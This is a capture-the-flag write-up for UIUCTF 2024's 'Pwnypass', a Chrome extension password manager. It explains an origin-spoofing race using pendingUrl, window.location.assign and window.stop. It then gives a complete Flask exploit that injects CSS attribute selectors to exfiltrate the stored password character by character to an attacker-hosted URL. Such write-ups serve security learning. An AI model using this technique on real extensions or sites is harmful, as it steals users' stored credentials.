---
title: Pwnypass - uiuctf 2024
date: 2024-07-08 01:14:26
author: h3ri0s
author_url: https://x.com/h3ri0s
categories:
  - Web
tags:
  - uiuctf
  - CSS Injection
  - Web
---

**tl;dr**

+ Chrome extension debugging and exploitation
+ Leaking flag byte by byte using css injection

<!--more-->

**Challenge Points**: 495
**No. of solves**: 9


## Challenge Description

This challenge is a Chrome extension password manager that accepts usernames and passwords on different domains and stores these credentials in local storage. The corresponding username and password are loaded in an iframe when the origin is matched.

Here is the tree structure of the challenge

```jsx
└── challenge
    ├── bot.js
    ├── Dockerfile
    ├── ext
    │   ├── autofill.html
    │   ├── autofill.js
    │   ├── background.js
    │   ├── content.js
    │   ├── icon.png
    │   └── manifest.json
    ├── flag1.txt
    └── flag2.txt
```

Lets look into important files in here

### Background.js

- There are mainly 3 commands that can be issued from the token
    
    ```jsx
    const commands = {
        read,
        write,
        evaluate // DEPRECATED! Will be removed in next release.
    }
    ```
    
- looks for 2 request actions **redeem** and **issue**
    
    ```jsx
        if (request.action === "issue") {
            // generate token
            const ts = Math.floor(Date.now()/1000);
            const tab = sender.tab.id; // getting tab id 
            const origin = await getOrigin(tab);
            console.log(tab);
            console.log(origin);
            const command = request.command;
            if (!commands.hasOwnProperty(command)) return;
    
            request.args.length = 2; // max 2 args
            if (request.args.some((arg) => arg.includes('|'))) return; // wtf, no.
            const args = request.args.join('|');
            console.log('issue successful!');
    
            const token = `${ts}|${tab}|${origin}|${command}|${args}`;
            return [token, await doHmac(token)]; //giving token and hmac 
        }
    
        if (request.action === "redeem") {
            // redeem a token
            const {token, hmac} = request;
            console.log(`redeeming ${token} ${hmac}`)
            if (await doHmac(token) !== hmac) return;
            let [ts, tab, origin, command] = token.split("|");
            if (parseInt(ts) + 60*5 < Math.floor(Date.now()/1000)) return;  //checks if token less than 5 min 
            if (sender.tab.id !== parseInt(tab)) return;
            if (await getOrigin(parseInt(tab)) !== origin) return;
            console.log('redemption successful!');
    
            const args = token.split("|").slice(-2);
            return await commands[command](origin, ...args); //gives the result of the correspoding commands in command object 
        }
    ```
    
    - **Issue**: returns token and hmac
        - token format `${ts}|${tab}|${origin}|${command}|${args}`

### Content.js

- issues a read token when username field is found
- for **change** event-listener it issues write token
- when **submit** is clicked,it redeems the token
- the readtoken issued is send to **autofill.html** as params
- uses **autofill.html** as iframe.

### Autofill.js

- Takes in token and hmac
- gets the cred for the same
- using this cred, it adds the details to **autofill.html**

To obtain the flag, a bot is provided. It first visits the site [`https://pwnypass.c.hc.lc/login.php`](https://pwnypass.c.hc.lc/login.php) and log in a username: `pwnypass` and **flag** as the password. After that, it visits the url which we provide.
- bot setting up the username and password
    ```js
        socket.write(`Setting up...\n`);
        const browser = await puppeteer.launch(puppeter_args);
        let page = await browser.newPage();
        await page.goto('https://pwnypass.c.hc.lc/login.php', {waitUntil: 'networkidle2'});
        await new Promise((res)=>setTimeout(res, 500));
        await page.type('input[name="username"]', 'sigpwny');
        await page.type('input[name="password"]', FLAG1);
        await page.click('body');
        await new Promise((res)=>setTimeout(res, 500));
        await page.click('input[type="submit"]');
        await new Promise((res)=>setTimeout(res, 500));
        await page.close();
        page = await browser.newPage();
        socket.write(`Loading page ${url}.\n`);
    ```
## Exploiting the extension

We know that the username and password is stored for the corresponding domain. We need to leak the password from the origin [`https://pwnypass.c.hc.lc/`](https://pwnypass.c.hc.lc/) .How do we do that?

Lets look into the following: 

### Changing Origin

In **background.js,**  to get the origin of the site they have used the following code :

```jsx
 const getOrigin = async (id) => new Promise((res)=>chrome.tabs.get(id, (t)=>setTimeout(()=>res(new URL(t.pendingUrl ?? t.url).origin),200)));
```

The **pendingUrl** here gets the sender’s origin .

There is a timeout for 200 ms to resolve this promise . if the `pendingUrl` is null then it takes the current url as origin.

Due to this, we can trick the browser by giving **pendingUrl** as [`https://pwnypass.c.hc.lc/`](https://pwnypass.c.hc.lc/) 

But how do we do that ?

**From @Starlight**

Using `window.location.assign(url)` this causes the window to load and display the document at the URL specified.

but how do we prevent the site from fully redirecting? 

Using `window.stop()` stops further resource loading in the current browsing context

So, using these, we can change the origin in **background.js** and retrieve the corresponding username and password from our hosted site. But how will we get the flag, considering it's loaded in autofill.html as an iframe?

If we look the into **manifest.json** ,we can find the csp is set as the following : 

```jsx
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'none';",
```

thus, our scheme to weave xss falls apart.

### Css Injection

In **autofill.js,** we can use css injection to leak the **password(flag)** character by character. 

```jsx
    let output = "";
    for (let cred of creds) {
        output += `
        <div class="entry">
        <div data-username="${cred.username}" class="user">${cred.username}</div>
        <div data-password="${cred.password}" class="pass">${cred.password}</div>
        </div><hr>`;
    }
    output = `<div>${output}</div>`;
```

Creating an exploit in such a way that it checks if each character of the flag matches, and then attempts to load the url as background will allow us to retrieve each byte of the flag

## Final Exploit

```python
from flask import Flask
import string

app = Flask(__name__)

url="URL"
flag = "uiuctf{0h_no_th3_pwn1es_4r3_c0mpr0m1sed_f"

def css_payload():
    style = ""
    for c in string.ascii_lowercase+string.digits+"{}_?!@#$%^&*(":
        style += f'[data-username="sigpwny"]~[data-password^="{flag}{c}"]{{background:url({url}/part/{ord(c)});}}'
    return style    

@app.route("/brute")
def brute():

    return str.format("""
<form id=f><input type=text id=u value='demo'><input type=password id=p value='<style>{0}</style>'></form>
<script>
const delay = t => new Promise(r => setTimeout(r, t));
onload = async () => {{
    await delay(1000);
    window.location.assign("https://pwnypass.c.hc.lc/");
    p.dispatchEvent(new Event('change'));
    await delay(18);
    window.stop();
    await delay(300);
    window.location.assign("https://pwnypass.c.hc.lc/");
    f.dispatchEvent(new Event('submit'));
    await delay(18);    
    window.stop();
    await delay(200);
    window.location.assign("https://pwnypass.c.hc.lc/login.php");
}};
</script>
""", css_payload())

@app.route('/part/<int:char>')
def part(char):
    global flag
    flag += chr(char)
    print('\nCurrent flag:', flag)
    return ''

if __name__=="__main__":
    app.run(port=1234)

```

This payload leaks the flag part by part and joining them would get us the flag.